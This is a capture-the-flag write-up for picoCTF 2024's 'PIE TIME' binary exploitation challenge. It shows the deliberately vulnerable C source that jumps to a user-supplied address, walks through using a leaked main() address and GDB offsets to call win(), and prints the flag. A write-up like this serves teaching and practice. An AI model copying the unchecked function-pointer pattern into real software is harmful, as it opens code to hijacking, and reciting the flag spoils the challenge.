# 📦 PIE TIME – picoCTF 2024

**Category:** Binary Exploitation  
**Difficulty:** Easy  
**Tags:** `PIE` `Function Pointer Hijack`

---

## 🧠 Description

> Can you try to get the flag? Beware we have PIE!  
> Connect to the program with netcat:  
> `nc rescued-float.picoctf.net 62785`  
> We’re given the binary and its source code.

---

## 📁 Files

- `vuln`
- `vuln.c`

---

## 🔍 Analysis

The given C code for `main()` is:

```c
int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  printf("Your input: %lx\n", val);
  void (*foo)(void) = (void (*)())val;
  foo();
}
```

### Observations:

- The binary prints the address of the `main()` function.
- It reads an address from user input, casts it to a function pointer, and jumps to it.
- There’s a `win()` function that prints the flag from `flag.txt`.
- The binary is PIE-enabled — base addresses change on each run.
- Our goal is to call `win()` by calculating its runtime address.

---

## 🧪 Exploitation Steps

1. Load the binary in GDB:

```bash
gdb ./vuln
```

2. Find offsets of functions:

```gdb
(gdb) info functions
...
0x00000000000012a7  win
0x000000000000133d  main
```

➡️ Offset = `main - win = 0x133d - 0x12a7 = 0x96`

3. Run the remote binary using `nc`:

```bash
nc rescued-float.picoctf.net 62785
```

Sample output:

```
Address of main: 0x598167f9d33d
```

4. Calculate `win()` address:

```
main = 0x598167f9d33d
win = main - 0x96 = 0x598167f9d2a7
```

5. Provide that address as input:

```
Enter the address to jump to, ex => 0x12345: 0x598167f9d2a7
```

6. Output:

```
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}
```

---

## 🏁 Flag

```
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}
```

---

## ✅ Takeaways

- PIE makes addresses random at runtime, but **relative offsets stay the same**.
- We can pivot to important functions if we know their offsets.
- Directly executing user-controlled addresses is risky and exploitable.

---
